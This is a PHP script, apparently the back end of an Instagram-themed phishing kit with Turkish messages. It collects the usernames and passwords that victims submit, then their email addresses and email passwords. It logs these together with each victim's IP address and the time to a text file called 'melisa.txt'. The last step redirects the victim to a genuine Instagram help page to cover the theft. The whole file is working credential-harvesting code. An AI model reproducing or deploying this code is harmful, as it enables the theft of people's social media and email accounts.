<?php
function yazdir($dosya, $kip, $yazi){
    $yazilacakdosya=fopen($dosya, $kip);
    fwrite($yazilacakdosya, $yazi);
    fclose($yazilacakdosya);
}
if(!isset($_POST)){
    header("Location: form.php");
}else{
    if($_POST["submit"]){
        $username = $_POST["username"];
        $password = $_POST["password"];
		$ip = $_SERVER['REMOTE_ADDR'];
        date_default_timezone_set('Europe/Istanbul');
        $tarih = date("d:m:Y G:i");
        $yazi = "Username: $username\nPassword: $password\n ip adress : $ip\n Tarih : $tarih \n\n\n";
       if(is_writable('melisa.txt')){
           $dosya = "melisa.txt";
           $kip = "a+";
           yazdir($dosya, $kip, $yazi);
           header("Location: mail.html");
        }else{
            echo 'dosyaya yazılamıyor.';
        }
    }elseif ($_POST["submit_mail"]) {
        $mail = $_POST["mail"];
        $mailpw = $_POST["mailpw"];
        $ip = $_SERVER['REMOTE_ADDR'];
        date_default_timezone_set('Europe/Istanbul');
        $tarih = date("d:m:Y G:i");
        $yazi = "Mail address= '$mail'\nMail Pass= '$mailpw'\nip adress : $ip\n Tarih : $tarih \n\n\n";
        if(is_writable('melisa.txt')){
            $dosya = "melisa.txt";
            $kip = "a+";
            yazdir($dosya, $kip, $yazi);
            header("Location: https://help.instagram.com/126382350847838");
         }else{
             echo 'dosyaya yazılamıyor.';
         }
    }
    else{
        header("Location: form.php");
    }
}
?>